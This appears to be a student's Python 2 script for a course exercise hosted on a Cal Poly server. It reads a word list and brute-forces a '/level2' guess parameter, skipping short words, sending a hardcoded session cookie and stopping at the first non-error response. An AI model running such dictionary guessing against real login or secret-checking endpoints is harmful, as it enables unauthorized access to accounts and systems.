import urllib2 

server = "http://cpe123.csc.calpoly.edu:443"
token = "b25350ce985d2988de3f457f96196b923563f37e"

f = open("words.txt")
content = f.readlines()

for guess in content:
	req = urllib2.Request(server + "/level2?guess=" + guess)
	req.add_header('Cookie', 'webpy_session_id=' + token)
	if len(guess) >= 9:
		try:
			response = urllib2.urlopen(req)
			print guess, response.getcode()
		except urllib2.HTTPError as e:
			print guess, e.code
		else:
			quit()
	else:
		continue

